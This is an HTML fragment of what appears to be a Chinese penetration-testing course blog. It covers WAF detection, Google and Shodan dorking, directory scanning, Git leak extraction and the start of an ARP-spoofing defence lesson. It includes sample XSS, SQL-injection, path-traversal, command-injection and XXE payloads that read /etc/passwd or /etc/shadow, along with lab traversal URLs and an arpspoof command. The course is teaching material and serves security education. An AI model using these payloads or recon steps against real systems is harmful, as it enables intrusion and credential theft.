title="方法"></a>方法</h3><ol><li>额外的cookie，比如云锁</li><li>任何响应或请求的附加标头，比如安全宝 </li><li>响应内容（如果被阻止请求）增加标识，比 如DotDefender, Armor, Sitelock </li><li>响应代码（如果被阻止请求），比如 WebKnight, 360 WAF</li></ol><h3 id="指纹库"><a href="#指纹库" class="headerlink" title="指纹库"></a>指纹库</h3><p> <a href="https://github.com/CSecGroup/wafid/blob/master/finger.xml">https://github.com/CSecGroup/wafid/blob/master/finger.xml</a> </p><h2 id="怎么触发WAF"><a href="#怎么触发WAF" class="headerlink" title="怎么触发WAF"></a>怎么触发WAF</h2><p>URL或者表单输入恶意内容 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xsstring <span class="token operator">=</span> <span class="token string">'&lt;script&gt;alert("XSS");&lt;/script&gt;'</span>sqlistring <span class="token operator">=</span> <span class="token string">"UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or '"</span>lfistring <span class="token operator">=</span> <span class="token string">'../../../../etc/passwd'</span>rcestring <span class="token operator">=</span> <span class="token string">'/bin/cat /etc/passwd; ping 127.0.0.1; curl google.com'</span>xxestring <span class="token operator">=</span> <span class="token string">'&lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;]&gt;&lt;pwn&gt;&amp;hack;&lt;/pwn&gt;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WAF的识别工具"><a href="#WAF的识别工具" class="headerlink" title="WAF的识别工具"></a>WAF的识别工具</h2><h3 id="Kali自带"><a href="#Kali自带" class="headerlink" title="Kali自带"></a>Kali自带</h3><p><code>wafw00f https://www.12306.cn</code> </p><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a> </p><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p><code>nmap www.12306.cn --script=http-wafdetect.nse</code> </p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><code>sqlmap -u "https://pinpai.smzdm.com/1773/gushi/?id=1" --identify-waf --batch</code> </p><h3 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h3><p><a href="https://github.com/0xInfection/Awesome-WAF">https://github.com/0xInfection/Awesome-WAF</a></p><h1 id="搜索引擎收集信息"><a href="#搜索引擎收集信息" class="headerlink" title="搜索引擎收集信息"></a>搜索引擎收集信息</h1><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><ul><li>2002 </li><li>Johnny Long </li><li>Google Dorks ——Google Hacking</li></ul><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul><li><p>完全匹配 </p><p>“网络安全工程师” </p></li><li><p>任意字词 </p><p>批发 OR 特价 </p></li><li><p>不包含 </p><p>burp suite -xxx </p></li><li><p>数字范围 </p><p>number..number</p></li></ul><h2 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h2><h3 id="只搜索某个网站的内容-、"><a href="#只搜索某个网站的内容-、" class="headerlink" title="只搜索某个网站的内容 、"></a>只搜索某个网站的内容 、</h3><p><code>site:zhihu.com</code> </p><h3 id="网页的内容包括"><a href="#网页的内容包括" class="headerlink" title="网页的内容包括"></a>网页的内容包括</h3><p><code>allintext: Powered by Discuz</code> </p><p><code>intext: Powered by Discuz</code> </p><h3 id="标题出现"><a href="#标题出现" class="headerlink" title="标题出现"></a>标题出现</h3><p><code>intitle: 后台登录</code> </p><p><code>allintitle: 后台登录</code> </p><h3 id="URL地址包括"><a href="#URL地址包括" class="headerlink" title="URL地址包括"></a>URL地址包括</h3><p><code>allinurl: admin.php</code> </p><p><code>inurl: index.php?id=1</code> </p><h3 id="文件类型指定"><a href="#文件类型指定" class="headerlink" title="文件类型指定"></a>文件类型指定</h3><p>filetype:pdf </p><h3 id="index-of"><a href="#index-of" class="headerlink" title="index of"></a>index of</h3><h3 id="可以结合使用"><a href="#可以结合使用" class="headerlink" title="可以结合使用"></a>可以结合使用</h3><h2 id="语法数据库"><a href="#语法数据库" class="headerlink" title="语法数据库"></a>语法数据库</h2><ul><li><a href="https://www.exploit-db.com/googlehacking-database">https://www.exploit-db.com/googlehacking-database</a></li><li><a href="https://github.com/BullsEye0/google_dork_list">https://github.com/BullsEye0/google_dork_list</a></li></ul><h2 id="工具-5"><a href="#工具-5" class="headerlink" title="工具"></a>工具</h2><h3 id="github搜索"><a href="#github搜索" class="headerlink" title="github搜索"></a>github搜索</h3><ul><li>google hacking </li><li>google dorks</li></ul><h1 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h1><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><h3 id="360水滴直播时间"><a href="#360水滴直播时间" class="headerlink" title="360水滴直播时间"></a>360水滴直播时间</h3><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><ul><li>除了网络摄像头之外，网络空间还包括什么？ </li><li>黑客是怎么找到某一个网络设备的？</li></ul><h2 id="什么是网络空间？"><a href="#什么是网络空间？" class="headerlink" title="什么是网络空间？"></a>什么是网络空间？</h2><h3 id="Cyber-space"><a href="#Cyber-space" class="headerlink" title="Cyber space"></a>Cyber space</h3><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><ul><li>1996  数字图书馆</li><li>1998 谷歌诞生</li></ul><h2 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h2><ul><li>网页  </li><li>图片 </li><li>音乐 </li><li>声音 </li><li>电视剧 </li><li>……</li></ul><h3 id="进一步"><a href="#进一步" class="headerlink" title="进一步"></a>进一步</h3><h5 id="网络系统"><a href="#网络系统" class="headerlink" title="网络系统"></a>网络系统</h5><ul><li>CDN </li><li>CMS </li><li>IDS intrusion detection system </li><li>办公软件 数</li><li>据库服务 </li><li>杀毒软件 </li><li>文件服务NFS</li></ul><h5 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h5><ul><li>手机 </li><li>平板电脑 </li><li>交换机 </li><li>路由器 </li><li>网络摄像头 </li><li>私人网盘 </li><li>打印机 </li><li>ATM </li><li>物联网家电 </li><li>机器人</li></ul><h5 id="工业系统"><a href="#工业系统" class="headerlink" title="工业系统"></a>工业系统</h5><ul><li>交通信号灯 </li><li>企业大屏幕 </li><li>公园控制系统 </li><li>加油站 </li><li>电网 </li><li>自来水厂 </li><li>核电站</li></ul><h2 id="网络空间搜索引擎-1"><a href="#网络空间搜索引擎-1" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><h3 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h3><p>Open source intelligence </p><p>开源网络情报 </p><h3 id="怎么扫描？"><a href="#怎么扫描？" class="headerlink" title="怎么扫描？"></a>怎么扫描？</h3><h4 id="用网络扫描的工具"><a href="#用网络扫描的工具" class="headerlink" title="用网络扫描的工具"></a>用网络扫描的工具</h4><ul><li>nmap </li><li>zmap</li></ul><h4 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h4><ul><li>IP库 </li><li>枚举</li></ul><h3 id="怎么标识一个设备呢？"><a href="#怎么标识一个设备呢？" class="headerlink" title="怎么标识一个设备呢？"></a>怎么标识一个设备呢？</h3><ul><li>爬虫 ——url </li><li>ip ——域名 </li><li>开放端口 </li><li>操作系统 </li><li>物理地址 ——深圳、北京 </li><li>MAC地址 </li><li>设备的类型</li></ul><h3 id="实施威胁地图"><a href="#实施威胁地图" class="headerlink" title="实施威胁地图"></a>实施威胁地图</h3><p><a href="https://www.fireeye.com/cyber-map/threatmap.html">https://www.fireeye.com/cyber-map/threatmap.html</a> </p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p> 安全研究者</p><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><h3 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h3><ul><li><p>地图、截图、监控 </p></li><li><p>新手指引 </p></li><li><p>视频教程 </p></li><li><p>开发者工具 </p></li><li><p>Filter过滤器 </p><p>​e.g. 基本使用</p></li></ul><p>​<code>tomcat country:"CN"</code> </p><p>​<code>apache city:"Changsha"</code> </p><p>​<code>server: gws hostname:"google"</code></p><ul><li>Explore</li></ul><h3 id="CLI"><a href="#CLI" class="headerlink" title="CLI"></a>CLI</h3><ul><li>命令行工具 </li><li>kali自带 </li><li>alert Manage the network alerts for your account # 管理账户的网络提示</li><li>convert Convert the given input data file into a… # 转换输入文件</li><li>count Returns the number of results for a search # 返回查询结果数量 </li><li>download Download search results and save them in a… # 下载查询结果到文件 </li><li>honeyscore Check whether the IP is a honeypot or not. # 检查 IP 是否为蜜罐 </li><li>host View all available information for an IP… # 显示一个 IP 所有可用的详细信息 </li><li>info Shows general information about your account # 显示账户的一般信息</li><li>init Initialize the Shodan command-line # 初始化命令行 </li><li>myip Print your external IP address # 输出 用户当前公网IP </li><li>parse Extract information out of compressed JSON… # 解析提取压缩的JSON信 息，即使用download下载的数据 </li><li>scan Scan an IP/ netblock using Shodan. # 使用 Shodan 扫描一个IP或者网段 </li><li>search Search the Shodan database # 查询 Shodan 数据库 </li><li>stats Provide summary information about a search… # 提供搜索结果的概要信息 </li><li>stream Stream data in real-time. # 实时显示 流数据 # 管理账户的网络提示</li></ul><h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><ul><li><code>shodan host 172.67.167.88</code> </li><li><code>shodan count apache shodan</code> </li><li><code>count vuln:cve-2019-0708</code> </li><li><code>shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0</code> </li><li><code>shodan stats port:445 SMB</code> </li><li><code>shodan download --limit -1 test net:172.67.167.88/24</code></li></ul><h3 id="工具-6"><a href="#工具-6" class="headerlink" title="工具"></a>工具</h3><ul><li><a href="https://github.com/jakejarvis/awesomeshodan-queries">https://github.com/jakejarvis/awesomeshodan-queries</a> （语法） </li><li><a href="https://github.com/random-robbie/MyShodan-Scripts">https://github.com/random-robbie/MyShodan-Scripts</a> （python脚本）</li></ul><h2 id="其他的网络空间搜索引擎"><a href="#其他的网络空间搜索引擎" class="headerlink" title="其他的网络空间搜索引擎"></a>其他的网络空间搜索引擎</h2><h3 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h3><ul><li>没有收费</li><li>收录了证书 </li><li>ZMap和ZGrab</li></ul><h3 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h3><ul><li>网络空间资源测绘</li><li>Xmap</li></ul><h3 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h3><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><ul><li><p>创建的时间 </p></li><li><p>搜索的内容 </p><p>web系统 </p><p>SSL </p><p>图标 </p><p>网络设备 </p></li><li><p>现有的数据 </p></li><li><p>扫描的引擎</p></li><li><p>更新频率 </p></li><li><p>API支持 </p></li><li><p>价格</p></li></ul><h2 id="工具-7"><a href="#工具-7" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a> </li><li><a href="https://github.com/coco413/DiscoverTarget">https://github.com/coco413/DiscoverTarget</a> </li><li><a href="https://github.com/saucer-man/saucerfram">https://github.com/saucer-man/saucerfram</a></li></ul><h1 id="目录扫描收集信息"><a href="#目录扫描收集信息" class="headerlink" title="目录扫描收集信息"></a>目录扫描收集信息</h1><h2 id="什么是目录扫描"><a href="#什么是目录扫描" class="headerlink" title="什么是目录扫描"></a>什么是目录扫描</h2><h3 id="部署的网站有一些敏感文件"><a href="#部署的网站有一些敏感文件" class="headerlink" title="部署的网站有一些敏感文件"></a>部署的网站有一些敏感文件</h3><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>xxx.cfg </p><h4 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a>数据文件</h4><ul><li>xxx.sql </li><li>.tar.gz</li></ul><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul><li>/backup </li><li>/conf </li><li>/admin</li></ul><h3 id="会泄露哪些信息"><a href="#会泄露哪些信息" class="headerlink" title="会泄露哪些信息"></a>会泄露哪些信息</h3><ul><li>数据库用户名和密码 </li><li>网站源码</li><li>服务器的用户名和密码 </li><li>数据库的文件 </li><li>…..</li></ul><h3 id="为什么会泄露？"><a href="#为什么会泄露？" class="headerlink" title="为什么会泄露？"></a>为什么会泄露？</h3><h4 id="配置不当的问题"><a href="#配置不当的问题" class="headerlink" title="配置不当的问题"></a>配置不当的问题</h4><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><h5 id="local-file-inclusion（LFI）"><a href="#local-file-inclusion（LFI）" class="headerlink" title="local file inclusion（LFI）"></a>local file inclusion（LFI）</h5><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><ul><li>header.php </li><li>common.php </li><li>footer.php </li><li>function.php</li></ul><h5 id="include-“路径-x2F-文件”"><a href="#include-“路径-x2F-文件”" class="headerlink" title="include(“路径/文件”)"></a>include(“路径/文件”)</h5><p>include(“../../..”) </p><h5 id="require"><a href="#require" class="headerlink" title="require();"></a>require();</h5><h5 id="dvwa靶场"><a href="#dvwa靶场" class="headerlink" title="dvwa靶场"></a>dvwa靶场</h5><p><a href="http://localhost/dvwa/vulnerabilities/fi/?page=%60../../phpinfo.php%60">http://localhost/dvwa/vulnerabilities/fi/?page=`../../phpinfo.php`</a> </p><p><a href="http://localhost/dvwa/vulnerabilities/fi/?page=%60../../../../../../../in.txt%60">http://localhost/dvwa/vulnerabilities/fi/?page=`../../../../../../../in.txt`</a></p><h2 id="常见的敏感目录和文件"><a href="#常见的敏感目录和文件" class="headerlink" title="常见的敏感目录和文件"></a>常见的敏感目录和文件</h2><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><h3 id="sitemap-xml"><a href="#sitemap-xml" class="headerlink" title="sitemap.xml"></a>sitemap.xml</h3><h3 id="网站的备份文件-x2F-数据"><a href="#网站的备份文件-x2F-数据" class="headerlink" title="网站的备份文件/数据"></a>网站的备份文件/数据</h3><h4 id="在线压缩"><a href="#在线压缩" class="headerlink" title="在线压缩"></a>在线压缩</h4><ul><li><p>路径 </p></li><li><p>文件名 </p></li><li><p>wwwroot </p><p>20210819.zip</p></li></ul><h4 id="帝国备份王"><a href="#帝国备份王" class="headerlink" title="帝国备份王"></a>帝国备份王</h4><p>1.sql ——1.zip </p><h3 id="后台登录的目录"><a href="#后台登录的目录" class="headerlink" title="后台登录的目录"></a>后台登录的目录</h3><ul><li>/admin </li><li>/manage</li></ul><h3 id="安装包（源码）"><a href="#安装包（源码）" class="headerlink" title="安装包（源码）"></a>安装包（源码）</h3><ul><li>非开源，商用 </li><li>1.zip</li></ul><h3 id="上传的目录"><a href="#上传的目录" class="headerlink" title="上传的目录"></a>上传的目录</h3><ul><li>/upload </li><li>/upload.php </li><li>文件上传漏洞 webshell</li></ul><h3 id="mysql的管理界面"><a href="#mysql的管理界面" class="headerlink" title="mysql的管理界面"></a>mysql的管理界面</h3><ul><li>MySQL</li><li>web页面去管理 </li><li>phpadmin 密码爆破 webshell</li></ul><h3 id="程序的安装路径"><a href="#程序的安装路径" class="headerlink" title="程序的安装路径"></a>程序的安装路径</h3><ul><li>/install</li></ul><h3 id="php的探针"><a href="#php的探针" class="headerlink" title="php的探针"></a>php的探针</h3><ul><li>phpinfo </li><li>雅黑探针</li></ul><h3 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h3><ul><li><p>Ueditor </p><p><a href="https://github.com/fex-team/ueditor">https://github.com/fex-team/ueditor</a></p></li><li><p>kindeditor </p></li><li><p>CKeditor  </p></li><li><p>文件上传漏洞、命令注入</p></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li><code>/etc/passwd</code> </li><li><code>/etc/shadow</code> ——SHA512 </li><li><code>/etc/sudoers</code> ——sudo</li></ul><h3 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h3><p>.DS_Store </p><h3 id="编辑器的临时文件-swp"><a href="#编辑器的临时文件-swp" class="headerlink" title="编辑器的临时文件.swp"></a>编辑器的临时文件.swp</h3><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><ul><li><p>Windows IIS </p></li><li><p>Apache </p></li><li><p>pikachu靶场 </p><p><a href="http://localhost/pikachu/vul/dir/dir_list.php?title=jarheads.php">http://localhost/pikachu/vul/dir/dir_list.php?title=jarheads.php</a> </p><p><a href="http://localhost/pikachu/vul/dir/dir_list.php?title=../../../../Windows/win.ini">http://localhost/pikachu/vul/dir/dir_list.php?title=../../../../Windows/win.ini</a></p></li></ul><h3 id="tomcat-WEB-INF"><a href="#tomcat-WEB-INF" class="headerlink" title="tomcat WEB-INF"></a>tomcat WEB-INF</h3><ul><li>WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应 用组件配置及命名规则. </li><li>WEB-INF/database.properties : 数据库配置文件 </li><li>WEB-INF/classes/ : 一般用来存放Java类文件(.class) </li><li>WEB-INF/lib/ : 用来存放打包好的库(.jar) </li><li>WEB-INF/src/ : 用来放源代码(.asp和.php等)</li></ul><h3 id="其他非常规文件"><a href="#其他非常规文件" class="headerlink" title="其他非常规文件"></a>其他非常规文件</h3><ul><li>secret.txt</li><li>password.txt</li></ul><h2 id="文件扫描思路"><a href="#文件扫描思路" class="headerlink" title="文件扫描思路"></a>文件扫描思路</h2><h3 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h3><p>直接在域名后面拼接路径/文件名，如果返回 200，就是存在 </p><h3 id="扫描方法？"><a href="#扫描方法？" class="headerlink" title="扫描方法？"></a>扫描方法？</h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>dir xxx ——dir xxx </p><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>dict</p><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><h5 id="1位"><a href="#1位" class="headerlink" title="1位"></a>1位</h5><ul><li>a-z </li><li>0-9</li></ul><h5 id="2位"><a href="#2位" class="headerlink" title="2位"></a>2位</h5><ul><li>aa </li><li>00 </li><li>a0 </li><li>9z</li></ul><h4 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h4><ul><li>robots.txt </li><li>sitemap.xlml </li><li>网页中的其他链接</li></ul><h4 id="fuzz（模糊测试）"><a href="#fuzz（模糊测试）" class="headerlink" title="fuzz（模糊测试）"></a>fuzz（模糊测试）</h4><p> 字典 </p><ul><li>/word</li><li>/index.php?word=</li></ul><h2 id="文件扫描的字典"><a href="#文件扫描的字典" class="headerlink" title="文件扫描的字典"></a>文件扫描的字典</h2><h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><ul><li><p>wordlists</p></li><li><p>dirb </p><p>/usr/share/wordlists/dirb/common.txt</p></li></ul><h2 id="工具-8"><a href="#工具-8" class="headerlink" title="工具"></a>工具</h2><ul><li><p>kali </p></li><li><p>dirb </p></li><li><p>dirbuster </p></li><li><p>御剑 </p></li><li><p>Burp Suite</p><p>Intruder ——payload </p><p><a href="http://www.baidu.com/$bbs$">www.baidu.com/$bbs$</a> </p></li><li><p>DirBrute </p></li><li><p>Dirsearch </p></li><li><p>Dirmap </p></li><li><p>wfuzz</p></li></ul><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h4 id="WAF、IDS"><a href="#WAF、IDS" class="headerlink" title="WAF、IDS"></a>WAF、IDS</h4><ul><li>代理 </li><li>网络空间搜索引擎</li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li>权限 </li><li>删除敏感文件 </li><li>WAF、IDS</li></ul><h1 id="Git信息收集"><a href="#Git信息收集" class="headerlink" title="Git信息收集"></a>Git信息收集</h1><h3 id="什么是版本控制系统"><a href="#什么是版本控制系统" class="headerlink" title="什么是版本控制系统"></a>什么是版本控制系统</h3><h4 id="代码的恢复、备份"><a href="#代码的恢复、备份" class="headerlink" title="代码的恢复、备份"></a>代码的恢复、备份</h4><ul><li>修改仓库难以管理 </li><li>整个工程直接打包，占用空间过多</li></ul><h4 id="Version-Control-System"><a href="#Version-Control-System" class="headerlink" title="Version Control System"></a>Version Control System</h4><h4 id="发展阶段"><a href="#发展阶段" class="headerlink" title="发展阶段"></a>发展阶段</h4><h5 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h5><p>DVCS</p><h5 id="协同开发"><a href="#协同开发" class="headerlink" title="协同开发"></a>协同开发</h5><h6 id="文件冲突？"><a href="#文件冲突？" class="headerlink" title="文件冲突？"></a>文件冲突？</h6><ul><li>自动合并不冲突的内容 </li><li>标记冲突的内容</li></ul><h6 id="集中化的VCS"><a href="#集中化的VCS" class="headerlink" title="集中化的VCS"></a>集中化的VCS</h6><ul><li><p>Centralized Version Control Systems ——CVC</p></li><li><p>代表 </p><p>CVS Concurrent Versions System </p><p>SVN</p></li></ul><h5 id="去中心化"><a href="#去中心化" class="headerlink" title="去中心化"></a>去中心化</h5><h6 id="分布式CVS"><a href="#分布式CVS" class="headerlink" title="分布式CVS"></a>分布式CVS</h6><ul><li><p>Distributed Version Control System——DVCS</p></li><li><p>代表 </p><p>Github、Gitlab、码云 </p><p>Git ——Linus Torwalds——BitKeeper</p></li></ul><h2 id="为什么Git会导致信息泄露"><a href="#为什么Git会导致信息泄露" class="headerlink" title="为什么Git会导致信息泄露"></a>为什么Git会导致信息泄露</h2><h3 id="把私有仓库-x2F-隐私文件提交到了github"><a href="#把私有仓库-x2F-隐私文件提交到了github" class="headerlink" title="把私有仓库/隐私文件提交到了github"></a>把私有仓库/隐私文件提交到了github</h3><h3 id="部署项目的时候，不小心把-git-文件一起打包进去，放到web网站的目录下"><a href="#部署项目的时候，不小心把-git-文件一起打包进去，放到web网站的目录下" class="headerlink" title="部署项目的时候，不小心把 .git 文件一起打包进去，放到web网站的目录下"></a>部署项目的时候，不小心把 .git 文件一起打包进去，放到web网站的目录下</h3><p>java——.class—— war</p><h4 id="git有用的内容"><a href="#git有用的内容" class="headerlink" title=".git有用的内容"></a>.git有用的内容</h4><ul><li>.git/logs/HEAD 存储了git的log信息，可以找到历史的commit项 </li><li>.git/index 缓存git add的文件，暂存区 </li><li>.git/refs/stash git stash 把代码存入缓存区 </li><li>.git/refs/heads/master 记录了master的commit的hash </li><li>.git/objects/pack/.pack</li></ul><h2 id="Github搜索技巧"><a href="#Github搜索技巧" class="headerlink" title="Github搜索技巧"></a>Github搜索技巧</h2><ul><li>kali in:file 搜索文件中包含kali的代码 </li><li>kali in:path 搜索路径中包含kali的代码 </li><li>kali in:path,file 搜索路径、文件中包含kali的代码 </li><li>shodan language:python 搜索关键字shodan，语言为python的代码 </li><li>filename:config.php language:php 搜索文件名为config.php，且语言为php </li><li>kali topics:&gt;=5 标签数量大于等于5的 </li><li>kali size:&lt;1000 文件小于1KB的 </li><li>kali stars:10..50 star大于10小于50的 </li><li>kali pushed:&gt;2021-08-15 搜索在2021年8月15日之后提交的 </li><li>kali pushed:2021-07-01..2021-08-01 搜索在此区间 </li><li>kali created:&gt;=2021-06-01 创建时间 </li><li>kali pushed:&lt;2021-08-01 -language:java 搜索在2020年8月1日前push代码且排除java语</li></ul><h2 id="Git信息泄露利用方式"><a href="#Git信息泄露利用方式" class="headerlink" title="Git信息泄露利用方式"></a>Git信息泄露利用方式</h2><h3 id="找到-git"><a href="#找到-git" class="headerlink" title="找到.git"></a>找到.git</h3><ul><li>目录扫描 </li><li>robots.txt </li><li>搜索引擎搜索 — intitle:”Index of /.git”</li></ul><h3 id="把-git下载到本地"><a href="#把-git下载到本地" class="headerlink" title="把.git下载到本地"></a>把.git下载到本地</h3><ul><li><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> ——- python GitHack.py xxx.com/.git/ </li><li><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li><li><a href="https://github.com/wangyihang/githacker">https://github.com/wangyihang/githacker</a> </li><li><a href="https://github.com/WangWen-Albert/JGitHack">https://github.com/WangWen-Albert/JGitHack</a></li></ul><h3 id="用git的命令获取内容"><a href="#用git的命令获取内容" class="headerlink" title="用git的命令获取内容"></a>用git的命令获取内容</h3><ul><li>git log 获取提交记录</li><li>git reset –hard [log hash]  获取提交记录</li><li>git diff 获取提交记录</li></ul><h3 id="工具-9"><a href="#工具-9" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a> </p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h4 id="ctfhub技能树"><a href="#ctfhub技能树" class="headerlink" title="ctfhub技能树"></a>ctfhub技能树</h4><ul><li>Web——信息泄露——Git泄露——Log、Stash、 Index</li></ul><h4 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h4><ul><li>禁止套娃 </li><li>Mark loves cat</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8.ARP攻击防御</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/8.arp-gong-ji-fang-yu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/8.arp-gong-ji-fang-yu/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP攻击防御"><a href="#ARP攻击防御" class="headerlink" title="ARP攻击防御"></a>ARP攻击防御</h1><h2 id="1-ARP防御方法简介"><a href="#1-ARP防御方法简介" class="headerlink" title="1.ARP防御方法简介"></a>1.ARP防御方法简介</h2><p>ARP攻击的原理是向网关和靶机<strong>不停的发送ARP欺骗报文</strong>，我们的计算机或者网关就会<strong>实时更新ARP缓存表</strong>，从而出现安全漏洞。</p><p>假如对这种欺骗报文的处理是不相信或者不接受的话，就不会出现问题了。处理这种的欺骗的行为我们没办法提前在攻击端进行操作，因为敌人躲在暗处，而我们处明处。</p><p>针对这种情况我们可以从以下两方面入手：</p><ol><li>让我们的电脑<strong>不接收</strong>欺骗包</li><li>即使接收到欺骗的包也<strong>不相信</strong></li></ol><p>目前网络安全行业现有的ARP防御方案，基本都是基于上面两个方法实现的。</p><h2 id="2-windows防御"><a href="#2-windows防御" class="headerlink" title="2.windows防御"></a>2.windows防御</h2><h3 id="1-安装arp的防火墙"><a href="#1-安装arp的防火墙" class="headerlink" title="1.安装arp的防火墙"></a>1.安装arp的防火墙</h3><h5 id="1-安装360安全卫士-地址：https-www-360-cn"><a href="#1-安装360安全卫士-地址：https-www-360-cn" class="headerlink" title="1.安装360安全卫士 地址：https://www.360.cn/"></a>1.安装360安全卫士 地址：<a href="https://www.360.cn/">https://www.360.cn/</a></h5><h5 id="2-选择网络安全"><a href="#2-选择网络安全" class="headerlink" title="2.选择网络安全"></a>2.选择网络安全</h5><p><img src="/.%5Cassets%5C360%E9%80%89%E6%8B%A9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8.png" alt="360选择网络安全"></p><h5 id="3-选择流量防火墙"><a href="#3-选择流量防火墙" class="headerlink" title="3.选择流量防火墙"></a>3.选择流量防火墙</h5><p><img src="/.%5Cassets%5C360%E9%80%89%E6%8B%A9%E6%B5%81%E9%87%8F%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="360选择流量防火墙"></p><h5 id="4-选择局域网防护开启防火墙"><a href="#4-选择局域网防护开启防火墙" class="headerlink" title="4.选择局域网防护开启防火墙"></a>4.选择局域网防护开启防火墙</h5><p><img src="/.%5Cassets%5C360%E5%BC%80%E5%90%AF%E5%B1%80%E5%9F%9F%E7%BD%91%E9%98%B2%E6%8A%A4.png" alt="360开启局域网防护"></p><h5 id="5-开启ARP攻击"><a href="#5-开启ARP攻击" class="headerlink" title="5.开启ARP攻击"></a>5.开启ARP攻击</h5><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="6-查看防护效果"><a href="#6-查看防护效果" class="headerlink" title="6.查看防护效果"></a>6.查看防护效果</h5><p><img src="/.%5Cassets%5C360%E6%9F%A5%E7%9C%8B%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C.png" alt="360查看防护效果"></p><h5 id="7-查询本地arp表"><a href="#7-查询本地arp表" class="headerlink" title="7.查询本地arp表"></a>7.查询本地arp表</h5><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="8-关闭防火墙（退出360安全卫士）"><a href="#8-关闭防火墙（退出360安全卫士）" class="headerlink" title="8.关闭防火墙（退出360安全卫士）"></a>8.关闭防火墙（退出360安全卫士）</h5><h5 id="9-查看当前arp表"><a href="#9-查看当前arp表" class="headerlink" title="9.查看当前arp表"></a>9.查看当前arp表</h5><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="10-停止攻击"><a 